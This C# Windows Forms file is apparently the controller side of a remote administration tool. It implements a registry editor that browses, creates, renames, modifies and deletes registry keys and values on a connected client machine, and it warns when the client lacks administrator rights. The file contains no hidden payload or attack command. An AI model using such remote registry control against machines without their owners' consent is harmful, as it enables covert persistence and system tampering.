using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.Controls;
using xServer.Core.Networking;
using xServer.Core.Registry;

namespace xServer.Forms
{
    public partial class FrmRegistryEditor : Form
    {
        private readonly Client _connectClient;

        private readonly object locker = new object();

        #region Constants

        private const string PRIVILEGE_WARNING = "The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete my not work properly!";

        private const string DEFAULT_REG_VALUE = "(Default)";

        #endregion

        public FrmRegistryEditor(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRe = this;

            InitializeComponent();
        }

        #region Main Form

        private void FrmRegistryEditor_Load(object sender, EventArgs e)
        {
            //Check if user is not currently running as administrator
            if (_connectClient.Value.AccountType != "Admin")
            {
                //Prompt user of not being admin
                string msg = PRIVILEGE_WARNING;
                string caption = "Alert!";
                MessageBox.Show(msg, caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

            // Signal client to retrive the root nodes (indicated by null)
            new xServer.Core.Packets.ServerPackets.DoLoadRegistryKey(null).Execute(_connectClient);

            // Set the ListSorter for the listView
            this.lstRegistryKeys.ListViewItemSorter = new RegistryValueListItemComparer();
        }

        private void FrmRegistryEditor_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRe = null;
        }

        #endregion

        #region TreeView Helperfunctions

        private void AddRootKey(RegSeekerMatch match)
        {
            TreeNode node = CreateNode(match.Key, match.Key, match.Data);
            node.Nodes.Add(new TreeNode());
            tvRegistryDirectory.Nodes.Add(node);
        }

        private TreeNode CreateNode(string key, string text, object tag)
        {
            return new TreeNode()
            {
                Text = text,
                Name = key,
                Tag = tag
            };
        }

        public void AddKeysToTree(string rootName, RegSeekerMatch[] matches)
        {
            if (string.IsNullOrEmpty(rootName))
            {
                tvRegistryDirectory.Invoke((MethodInvoker)delegate
                {
                    tvRegistryDirectory.BeginUpdate();

                    foreach (var match in matches)
                    {
                        AddRootKey(match);
                    }

                    tvRegistryDirectory.SelectedNode = tvRegistryDirectory.Nodes[0];

                    tvRegistryDirectory.EndUpdate();
                });

            }
            else
            {

                TreeNode parent = GetTreeNode(rootName);

                if (parent != null)
                {
                    tvRegistryDirectory.Invoke((MethodInvoker)delegate
                    {
                        tvRegistryDirectory.BeginUpdate();

                        foreach (var match in matches)
                        {
                            //This will execute in the form thread
                            TreeNode node = CreateNode(match.Key, match.Key, match.Data);
                            if (match.HasSubKeys)
                                node.Nodes.Add(new TreeNode());

                            parent.Nodes.Add(node);
                        }

                        parent.Expand();
                        tvRegistryDirectory.EndUpdate();
                    });
                }
            }
        }

        public void AddKeyToTree(string rootKey, RegSeekerMatch match)
        {
            TreeNode parent = GetTreeNode(rootKey);

            tvRegistryDirectory.Invoke((MethodInvoker)delegate
            {
                //This will execute in the form thread
                TreeNode node = CreateNode(match.Key, match.Key, match.Data);
                if (match.HasSubKeys)
                    node.Nodes.Add(new TreeNode());

                parent.Nodes.Add(node);

                if (!parent.IsExpanded)
                {
                    tvRegistryDirectory.SelectedNode = parent;
                    tvRegistryDirectory.AfterExpand += new System.Windows.Forms.TreeViewEventHandler(this.specialCreateRegistryKey_AfterExpand);
                    parent.Expand();
                }
                else
                {
                    tvRegistryDirectory.SelectedNode = node;
                    tvRegistryDirectory.LabelEdit = true;
                    node.BeginEdit();
                }
            });
        }

        public void RemoveKeyFromTree(string rootKey, string subKey)
        {
            TreeNode parent = GetTreeNode(rootKey);

            //Make sure the key does exist
            if (parent.Nodes.ContainsKey(subKey)) {
                tvRegistryDirectory.Invoke((MethodInvoker)delegate
                {
                    parent.Nodes.RemoveByKey(subKey);
                });
            }
        }

        public void RenameKeyFromTree(string rootKey, string oldName, string newName)
        {
            TreeNode parent = GetTreeNode(rootKey);

            //Make sure the key does exist
            if (parent.Nodes.ContainsKey(oldName))
            {
                int index = parent.Nodes.IndexOfKey(oldName);

                tvRegistryDirectory.Invoke((MethodInvoker)delegate
                {
                    parent.Nodes[index].Text = newName;
                    parent.Nodes[index].Name = newName;

                    //Make sure that the newly renamed node is selected
                    //To allow update in the listview
                    if (tvRegistryDirectory.SelectedNode == parent.Nodes[index])
                        tvRegistryDirectory.SelectedNode = null;

                    tvRegistryDirectory.SelectedNode = parent.Nodes[index];
                });
            }
        }

        /// <summary>
        /// Trys to find the desired TreeNode given the fullpath to it.
        /// </summary>
        /// <param name="path">The fullpath to the TreeNode.</param>
        /// <returns>Null if an invalid name is passed or the TreeNode could not be found; The TreeNode represented by the fullpath;</returns>
        private TreeNode GetTreeNode(string path)
        {
            string[] nodePath = null;
            if (path.Contains("\\"))
            {
                nodePath = path.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);

                // Only one valid node. Probably malformed
                if (nodePath.Length < 2)
                    return null;
            }
            else
            {
                //Is a root node
                nodePath = new string[] { path };
            }

            // Keep track of the last node to reference for traversal.
            TreeNode lastNode = null;

            if (tvRegistryDirectory.Nodes.ContainsKey(nodePath[0]))
            {
                lastNode = tvRegistryDirectory.Nodes[nodePath[0]];
            }
            else
            {
                //Node is missing
                return null;
            }

            // Go through the rest of the node path.
            for (int i = 1; i < nodePath.Length; i++)
            {
                if (lastNode.Nodes.ContainsKey(nodePath[i]))
                {
                    lastNode = lastNode.Nodes[nodePath[i]];
                }
                else
                {
                    //Node is missing
                    return null;
                }
            }
            return lastNode;
        }

        #endregion

        #region Popup actions

        public void ShowErrorMessage(string errorMsg)
        {
            this.Invoke((MethodInvoker)delegate
            {
                MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            });

        }

        #endregion

        #region ListView Helpfunctions

        public void AddValueToList(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null )
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    List<RegValueData> ValuesFromNode = null;
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>)) {
                        ValuesFromNode = (List<RegValueData>)key.Tag;
                        ValuesFromNode.Add(value);
                    }
                    else
                    {
                        //The tag has a incorrect element or is missing data
                        ValuesFromNode = new List<RegValueData>();
                        ValuesFromNode.Add(value);
                        key.Tag = ValuesFromNode;
                    }

                    //Deactivate sorting
                    lstRegistryKeys.Sorting = SortOrder.None;

                    if (tvRegistryDirectory.SelectedNode == key)
                    {
                        RegistryValueLstItem item = new RegistryValueLstItem(value.Name, value.GetKindAsString(), value.GetDataAsString());
                        //unselect all
                        lstRegistryKeys.SelectedIndices.Clear();
                        lstRegistryKeys.Items.Add(item);
                        item.Selected = true;
                        lstRegistryKeys.LabelEdit = true;
                        item.BeginEdit();
                    }
                    else
                    {
                        tvRegistryDirectory.SelectedNode = key;
                    }
                });
            }
        }

        public void DeleteValueFromList(string keyPath, string valueName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    List<RegValueData> ValuesFromNode = null;
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>))
                    {
                        ValuesFromNode = (List<RegValueData>)key.Tag;
                        ValuesFromNode.RemoveAll(value => value.Name == valueName);
                    }
                    else
                    {
                        //Tag has incorrect element or is missing data
                        key.Tag = new List<RegValueData>();
                    }

                    if (tvRegistryDirectory.SelectedNode == key)
                    {
                        valueName = String.IsNullOrEmpty(valueName) ? DEFAULT_REG_VALUE : valueName; 
                        lstRegistryKeys.Items.RemoveByKey(valueName);
                    }
                    else
                    {
                        tvRegistryDirectory.SelectedNode = key;
                    }

                });
            }
        }

        public void RenameValueFromList(string keyPath, string oldName, string newName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    //Can only rename if the value exists in the tag
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>))
                    {
                        List<RegValueData> ValuesFromNode = (List<RegValueData>)key.Tag;
                        var value = ValuesFromNode.Find(item => item.Name == oldName);
                        value.Name = newName;

                        if (tvRegistryDirectory.SelectedNode == key)
                        {
                            var index = lstRegistryKeys.Items.IndexOfKey(oldName);
                            if (index != -1)
                            {
                                RegistryValueLstItem valueItem = (RegistryValueLstItem)lstRegistryKeys.Items[index];
                                valueItem.RegName = newName;
                            }
                        }
                        else
                        {
                            tvRegistryDirectory.SelectedNode = key;
                        }
                    }
                });
            }
        }

        public void ChangeValueFromList(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                lstRegistryKeys.Invoke((MethodInvoker)delegate
                {
                    //Can only change if the value exists in the tag
                    if (key.Tag != null && key.Tag.GetType() == typeof(List<RegValueData>))
                    {
                        List<RegValueData> ValuesFromNode = (List<RegValueData>)key.Tag;
                        var regValue = ValuesFromNode.Find(item => item.Name == value.Name);
                        regValue.Data = value.Data;

                        if (tvRegistryDirectory.SelectedNode == key)
                        {
                            //Make sure if it is a default value
                            string name = String.IsNullOrEmpty(value.Name) ? DEFAULT_REG_VALUE : value.Name;
                            var index = lstRegistryKeys.Items.IndexOfKey(name);
                            if (index != -1)
                            {
                                RegistryValueLstItem valueItem = (RegistryValueLstItem)lstRegistryKeys.Items[index];
                                valueItem.Data = value.GetDataAsString();
                            }
                        }
                        else
                        {
                            tvRegistryDirectory.SelectedNode = key;
                        }
                    }
                });
            }
        }

        private void UpdateLstRegistryKeys(TreeNode node)
        {
            selectedStripStatusLabel.Text = node.FullPath;

            List<RegValueData> ValuesFromNode = null;
            if (node.Tag != null && node.Tag.GetType() == typeof(List<RegValueData>))
            {
                ValuesFromNode = (List<RegValueData>)node.Tag;
            }

            PopulateLstRegistryKeys(ValuesFromNode);
        }

        private void PopulateLstRegistryKeys(List<RegValueData> values)
        {
            lstRegistryKeys.Items.Clear();

            // Make sure that the passed values are usable
            if (values != null && values.Count > 0)
            {
                foreach (var value in values)
                {
                    RegistryValueLstItem item = new RegistryValueLstItem(value.Name, value.GetKindAsString(), value.GetDataAsString());
                    lstRegistryKeys.Items.Add(item);
                }
            }
        }

        #endregion

        #region tvRegistryDirectory Action

        private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
        {
            //No need to edit if it is null
            if (e.Label != null)
            {
                //Prevent the change of the label
                e.CancelEdit = true;

                if (e.Label.Length > 0)
                {
                    if (e.Node.Parent.Nodes.ContainsKey(e.Label))
                    {
                        //Prompt error
                        MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        e.Node.BeginEdit();
                    }
                    else
                    {
                        //Normal rename action
                        //Perform Rename action
                        new xServer.Core.Packets.ServerPackets.DoRenameRegistryKey(e.Node.Parent.FullPath, e.Node.Name, e.Label).Execute(_connectClient);
                        tvRegistryDirectory.LabelEdit = false;
                    }
                }
                else
                {
                    //Prompt error
                    MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    e.Node.BeginEdit();
                }
            }
            else
            {
                //Stop editing if no changes where made
                tvRegistryDirectory.LabelEdit = false;
            }
        }

        private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            // Before expansion of the node, prepare the first node with RegistryKeys.
            TreeNode parentNode = e.Node;

            // If nothing is there (yet).
            if (String.IsNullOrEmpty(parentNode.FirstNode.Name))
            {
                tvRegistryDirectory.SuspendLayout();
                parentNode.Nodes.Clear();

                // Send a packet to retrieve the data to use for the nodes.
                new xServer.Core.Packets.ServerPackets.DoLoadRegistryKey(parentNode.FullPath).Execute(_connectClient);

                tvRegistryDirectory.ResumeLayout();
                //Cancel expand
                e.Cancel = true;
            }
        }

        private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != e.Node)
            {
                //Select the clicked node
                tvRegistryDirectory.SelectedNode = e.Node;
                //Activate sorting
                lstRegistryKeys.Sorting = SortOrder.Ascending;
            }

            /* Enable delete and rename if not root node */
            SetDeleteAndRename(tvRegistryDirectory.SelectedNode.Parent != null);

            //Check if right click, and if so provide the contrext menu
            if (e.Button == MouseButtons.Right)
            {
                Point pos = new Point(e.X, e.Y);
                tv_ContextMenuStrip.Show(tvRegistryDirectory, pos);
            }
        }

        private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {
            if (e.Node != null)
            {
                UpdateLstRegistryKeys(e.Node);
            }
        }

        private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                deleteRegistryKey_Click(this, e);
            }
        }

        #endregion

        #region ToolStrip Helpfunctions

        public void SetDeleteAndRename(bool enable)
        {
            this.deleteToolStripMenuItem.Enabled = enable;
            this.renameToolStripMenuItem.Enabled = enable;
            this.deleteToolStripMenuItem2.Enabled = enable;
            this.renameToolStripMenuItem2.Enabled = enable;
        }

        #endregion

        #region MenuStrip Action

        private void menuStripExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void menuStripDelete_Click(object sender, EventArgs e) {
            if(tvRegistryDirectory.Focused) {
                deleteRegistryKey_Click(this, e);
            }
            else if (lstRegistryKeys.Focused) {
                deleteRegistryValue_Click(this, e);
            }
        }

        private void menuStripRename_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.Focused)
            {
                renameRegistryKey_Click(this, e);
            }
            else if (lstRegistryKeys.Focused)
            {
                renameRegistryValue_Click(this, e);
            }
        }

        #endregion

        #region lstRegistryKeys action

        private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                Point pos = new Point(e.X, e.Y);
                //Try to check if a item was clicked
                if (lstRegistryKeys.GetItemAt(pos.X, pos.Y) == null)
                {
                    //Not on a item
                    lst_ContextMenuStrip.Show(lstRegistryKeys, pos);
                }
                else
                {
                    //Clicked on a item
                    selectedItem_ContextMenuStrip.Show(lstRegistryKeys, pos);
                }
            }
        }

        private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            if (e.Label != null && tvRegistryDirectory.SelectedNode != null)
            {
                //Prevent the change of the label
                e.CancelEdit = true;
                int index = e.Item;

                if (e.Label.Length > 0)
                {
                    if (lstRegistryKeys.Items.ContainsKey(e.Label))
                    {
                        //Prompt error
                        MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        lstRegistryKeys.Items[index].BeginEdit();
                        return;
                    }

                    //Normal rename action
                    //Perform Rename action
                    new xServer.Core.Packets.ServerPackets.DoRenameRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, lstRegistryKeys.Items[index].Name, e.Label).Execute(_connectClient);
                    
                    lstRegistryKeys.LabelEdit = false;
                }
                else
                {
                    //Prompt error
                    MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    lstRegistryKeys.Items[index].BeginEdit();

                }
            }
            else
            {
                lstRegistryKeys.LabelEdit = false;
            }
        }

        private void lstRegistryKeys_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            modifyToolStripMenuItem.Enabled = lstRegistryKeys.SelectedItems.Count == 1;
            modifyToolStripMenuItem1.Enabled = lstRegistryKeys.SelectedItems.Count == 1;
            modifyBinaryDataToolStripMenuItem.Enabled = lstRegistryKeys.SelectedItems.Count == 1;
            modifyBinaryDataToolStripMenuItem1.Enabled = lstRegistryKeys.SelectedItems.Count == 1;

            //Make sure that only one item selected and that the item is not a default 
            renameToolStripMenuItem1.Enabled = lstRegistryKeys.SelectedItems.Count == 1 && e.Item.Name != DEFAULT_REG_VALUE;
            renameToolStripMenuItem2.Enabled = lstRegistryKeys.SelectedItems.Count == 1 && e.Item.Name != DEFAULT_REG_VALUE;

            deleteToolStripMenuItem2.Enabled = lstRegistryKeys.SelectedItems.Count > 0;
        }

        private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                deleteRegistryValue_Click(this, e);
            }
        }

        private void lstRegistryKeys_Enter(object sender, EventArgs e)
        {
            /* Make the modifers visible */
            modifyNewtoolStripSeparator.Visible = true;

            modifyToolStripMenuItem1.Visible = true;
            modifyBinaryDataToolStripMenuItem1.Visible = true;
        }

        private void lstRegistryKeys_Leave(object sender, EventArgs e)
        {
            /* Disable the modify functions (only avaliable for registry values) */
            modifyNewtoolStripSeparator.Visible = false;

            modifyToolStripMenuItem1.Visible = false;
            modifyBinaryDataToolStripMenuItem1.Visible = false;
        }

        #endregion

        #region ContextMenu

        private void createNewRegistryKey_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                if (!(tvRegistryDirectory.SelectedNode.IsExpanded) && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
                {
                    //Subscribe (wait for node to expand)
                    tvRegistryDirectory.AfterExpand += new System.Windows.Forms.TreeViewEventHandler(this.createRegistryKey_AfterExpand);
                    tvRegistryDirectory.SelectedNode.Expand();
                }
                else
                {
                    //Try to create a new subkey
                    new xServer.Core.Packets.ServerPackets.DoCreateRegistryKey(tvRegistryDirectory.SelectedNode.FullPath).Execute(_connectClient);
                }
            }
        }

        private void deleteRegistryKey_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && tvRegistryDirectory.SelectedNode.Parent != null)
            {
                //Prompt user to confirm delete
                string msg = "Are you sure you want to permanently delete this key and all of its subkeys?";
                string caption = "Confirm Key Delete";
                var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (answer == DialogResult.Yes)
                {
                    string parentPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;

                    new xServer.Core.Packets.ServerPackets.DoDeleteRegistryKey(parentPath, tvRegistryDirectory.SelectedNode.Name).Execute(_connectClient);
                }
            }
        }

        private void renameRegistryKey_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && tvRegistryDirectory.SelectedNode.Parent != null)
            {
                tvRegistryDirectory.LabelEdit = true;
                tvRegistryDirectory.SelectedNode.BeginEdit();
            }
        }

        #region New Registry Value

        private void createStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                //Request the creation of a new Registry value of type REG_SZ
                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.String).Execute(_connectClient);
            }
        }

        private void createBinaryRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                //Request the creation of a new Registry value of type REG_BINARY
                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.Binary).Execute(_connectClient);
            }
        }

        private void createDwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                //Request the creation of a new Registry value of type REG_DWORD
                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.DWord).Execute(_connectClient);
            }
        }

        private void createQwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                //Request the creation of a new Registry value of type REG_QWORD
                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.QWord).Execute(_connectClient);
            }
        }

        private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                //Request the creation of a new Registry value of type REG_MULTI_SZ
                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.MultiString).Execute(_connectClient);
            }
        }

        private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                //Request the creation of a new Registry value of type REG_EXPAND_SZ
                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.ExpandString).Execute(_connectClient);
            }
        }

        #endregion

        #region Registry Value edit

        private void deleteRegistryValue_Click(object sender, EventArgs e)
        {
            if(tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count > 0) {
                //Prompt user to confirm delete
                string msg = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + (lstRegistryKeys.SelectedItems.Count == 1 ? "this value?": "these values?");
                string caption = "Confirm Value Delete";
                var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (answer == DialogResult.Yes)
                {
                    foreach (var item in lstRegistryKeys.SelectedItems)
                    {
                        if (item.GetType() == typeof(RegistryValueLstItem))
                        {
                            RegistryValueLstItem registyValue = (RegistryValueLstItem)item;
                            new xServer.Core.Packets.ServerPackets.DoDeleteRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, registyValue.RegName).Execute(_connectClient);
                        }
                    }
                }
            }
        }

        private void renameRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count == 1)
            {
                //Before edit make sure that it is not a default registry value
                if (lstRegistryKeys.SelectedItems[0].Name != DEFAULT_REG_VALUE)
                {
                    lstRegistryKeys.LabelEdit = true;
                    lstRegistryKeys.SelectedItems[0].BeginEdit();
                }
                
            }
        }

        private void modifyRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count == 1)
            {
                if (tvRegistryDirectory.SelectedNode.Tag != null && tvRegistryDirectory.SelectedNode.Tag.GetType() == typeof(List<RegValueData>))
                {
                    string keyPath = tvRegistryDirectory.SelectedNode.FullPath;
                    string name = lstRegistryKeys.SelectedItems[0].Name == DEFAULT_REG_VALUE ? "" : lstRegistryKeys.SelectedItems[0].Name;
                    RegValueData value = ((List<RegValueData>)tvRegistryDirectory.SelectedNode.Tag).Find(item => item.Name == name);

                    //Initialize the right form to allow editing
                    using (var frm = GetEditForm(keyPath, value, value.Kind))
                    {
                        if(frm != null)
                            frm.ShowDialog();
                    }
                }
            }
        }

        private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null && lstRegistryKeys.SelectedItems.Count == 1)
            {
                if (tvRegistryDirectory.SelectedNode.Tag != null && tvRegistryDirectory.SelectedNode.Tag.GetType() == typeof(List<RegValueData>))
                {
                    string keyPath = tvRegistryDirectory.SelectedNode.FullPath;
                    string name = lstRegistryKeys.SelectedItems[0].Name == DEFAULT_REG_VALUE ? "" : lstRegistryKeys.SelectedItems[0].Name;
                    RegValueData value = ((List<RegValueData>)tvRegistryDirectory.SelectedNode.Tag).Find(item => item.Name == name);

                    //Initialize binary editor
                    using (var frm = GetEditForm(keyPath, value, RegistryValueKind.Binary))
                    {
                        if (frm != null)
                            frm.ShowDialog();
                    }
                }
            }
        }

        #endregion

        #endregion

        #region Handlers

        private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == tvRegistryDirectory.SelectedNode)
            {
                //Trigger a click
                createNewRegistryKey_Click(this, e);

                //Unsubscribe
                tvRegistryDirectory.AfterExpand -= new System.Windows.Forms.TreeViewEventHandler(this.createRegistryKey_AfterExpand);
            }
        }

        //A special case for when the node was empty and add was performed before expand
        private void specialCreateRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == tvRegistryDirectory.SelectedNode)
            {
                tvRegistryDirectory.SelectedNode = tvRegistryDirectory.SelectedNode.FirstNode;
                tvRegistryDirectory.LabelEdit = true;

                tvRegistryDirectory.SelectedNode.BeginEdit();

                //Unsubscribe
                tvRegistryDirectory.AfterExpand -= new System.Windows.Forms.TreeViewEventHandler(this.specialCreateRegistryKey_AfterExpand);
            }
        }

        #endregion

        #region Help function

        private Form GetEditForm(string keyPath, RegValueData value, RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return new FrmRegValueEditString(keyPath, value, _connectClient);
                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    return new FrmRegValueEditWord(keyPath, value, _connectClient);
                case RegistryValueKind.MultiString:
                    return new FrmRegValueEditMultiString(keyPath, value, _connectClient);
                case RegistryValueKind.Binary:
                    return new FrmRegValueEditBinary(keyPath, value, _connectClient);
                default:
                    return null;
            }
        }

        #endregion

    }
}
